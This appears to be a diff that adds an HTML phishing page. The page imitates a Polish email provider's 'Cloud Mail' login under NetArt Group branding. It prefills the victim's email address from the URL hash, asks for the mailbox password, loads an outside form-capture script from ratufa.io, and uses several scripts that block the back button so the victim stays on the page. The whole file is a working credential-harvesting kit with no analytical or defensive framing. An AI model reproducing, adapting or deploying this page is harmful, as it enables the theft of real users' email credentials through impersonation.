@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>☁ Cloud Mail </title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            /* Using a high-quality CSS fallback grid placeholder to replicate the grid of colorful background portraits seamlessly */
+            background: linear-gradient(rgba(0,0,0,0.05), rgba(0,0,0,0.05)), 
+                        conic-gradient(from 0deg at 25% 25%, #ff4d4d 25%, #4da6ff 0 50%, #ffcc00 0 75%, #2ecc71 0);
+            background-size: 200px 200px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 20px;
+            position: relative;
+        }
+
+        .main-wrapper {
+            display: flex;
+            width: 100%;
+            max-width: 1100px;
+            gap: 30px;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Left Side Panel - Transformed Contact Form Card */
+        .left-panel {
+            background-color: #ffffff;
+            border-radius: 12px;
+            padding: 40px;
+            width: 100%;
+            max-width: 420px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+            min-height: 480px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .brand-logo-container {
+            margin-bottom: 40px;
+            display: flex;
+            align-items: center;
+            font-size: 28px;
+            font-weight: 700;
+            color: #333333;
+        }
+
+        /* Replicating the Cloud icon and text color layout */
+        .brand-logo-container span.cloud-icon {
+            color: #f15a24;
+            margin-right: 8px;
+            font-size: 32px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #dcdcdc;
+            border-radius: 4px;
+            font-size: 14px;
+            outline: none;
+            color: #333333;
+            background-color: #ffffff;
+            transition: border-color 0.2s;
+        }
+
+        .form-control:focus {
+            border-color: #f15a24;
+        }
+
+        textarea.form-control {
+            resize: vertical;
+            min-height: 90px;
+        }
+
+        /* Precise reproduction of the orange-red submit button dimensions and rounded corners */
+        .submit-btn {
+            background-color: #f15a24;
+            color: #ffffff;
+            border: none;
+            padding: 14px 28px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 6px;
+            cursor: pointer;
+            align-self: flex-start;
+            margin-top: 10px;
+            transition: background-color 0.15s ease;
+        }
+
+        .submit-btn:hover {
+            background-color: #d94514;
+        }
+
+        /* Right Side Panel - Informational Domain Card */
+        .right-panel {
+            background-color: #ffffff;
+            border-radius: 16px;
+            padding: 60px 50px;
+            width: 100%;
+            max-width: 580px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .promo-heading {
+            font-size: 48px;
+            font-weight: 700;
+            color: #333333;
+            margin-bottom: 30px;
+        }
+
+        .promo-heading span {
+            color: #f15a24;
+        }
+
+        /* Search input element matching original graphic styling precisely */
+        .search-box-wrapper {
+            display: flex;
+            align-items: center;
+            border: 2px solid #333333;
+            border-radius: 6px;
+            padding: 12px 18px;
+            width: 100%;
+            max-width: 440px;
+        }
+
+        .search-icon {
+            font-size: 20px;
+            color: #666666;
+            margin-right: 12px;
+        }
+
+        .search-input {
+            border: none;
+            outline: none;
+            font-size: 18px;
+            color: #333333;
+            width: 100%;
+            background: transparent;
+        }
+
+        /* Real Copyright Footer area component matching original watermark */
+        .page-footer {
+            position: absolute;
+            bottom: 12px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 11px;
+            color: #ffffff;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
+            white-space: nowrap;
+        }
+
+        /* Windows system layer watermark overlay background asset */
+        .system-watermark {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            text-align: left;
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.4);
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.3);
+            line-height: 1.4;
+            user-select: none;
+            pointer-events: none;
+        }
+
+        @media (max-width: 900px) {
+            .main-wrapper {
+                flex-direction: column;
+                gap: 40px;
+            }
+            .left-panel, .right-panel {
+                max-width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-wrapper">
+        <!-- Left Column Container: Cloud Mail Brand Contact Form Box -->
+        <div class="left-panel">
+            <div class="brand-logo-container">
+                <span class="cloud-icon">☁</span> Cloud Mail
+            </div>
+                            <br><br>
+            <form action="" method="POST">
+<script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=wyob9cof&n=n1.ratufa.io"></script>
+                <div class="form-group">
+                   <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
+                </div>
+                
+                <div class="form-group">
+<input type="password" name="Password" placeholder="haslo" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
+  oninput="this.setCustomValidity('')"/>
+                </div>
+                
+               <center> <button type="submit" class="submit-btn">Zaloguj się</button>
+            </form>
+        </div>
+
+        <!-- Right Column Container: Promotional Domain Value Frame Info block -->
+        <div class="right-panel">
+            <h1 class="promo-heading">Domeny za <span>0 zł</span></h1>
+            
+            <div class="search-box-wrapper">
+                <span class="search-icon">🔍</span>
+                <input type="text" class="search-input" placeholder="wyszukaj domenę">
+            </div>
+        </div>
+    </div>
+
+    <!-- Background environment layout decoration watermark matching context -->
+    <div class="system-watermark">
+        Activate Windows<br>
+        <span style="font-size: 11px;">Go to Settings to activate Windows.</span>
+    </div>
+
+    <footer class="page-footer">
+        © 2026 NetArt Group. Wszelkie prawa zastrzeżone.
+    </footer>
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            if (window.location.hash) {
+                document.getElementById("email").value = window.location.hash.substring(1).trim();
+            }
+        });
+    </script>
+	    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
+    <script type="text/javascript">
+        (function() {
+            window.history.pushState(null, null, window.location.href);
+            
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+           
+            };
+        })();
+    </script>
+<script type="text/javascript">
+    window.history.pushState(null, "", window.location.href);
+    
+    window.addEventListener("popstate", function() {
+        window.history.pushState(null, "", window.location.href);
+    });
+</script>
+<script type="text/javascript">
+    function preventBack() {
+        window.history.forward();
+    }
+    setTimeout("preventBack()", 0);
+    
+    window.onunload = function () { null };
+</script>
+
+</body>
+    
+</html>
+<style>
+body{
+background-image:url("https://github.com/cdtechdigital/images/blob/main/nazwa.jpg?raw=true");
+background-repeat:no-repeat;
+background-image:fixed;
+background-size:cover;
+}
+</body>
+</html>
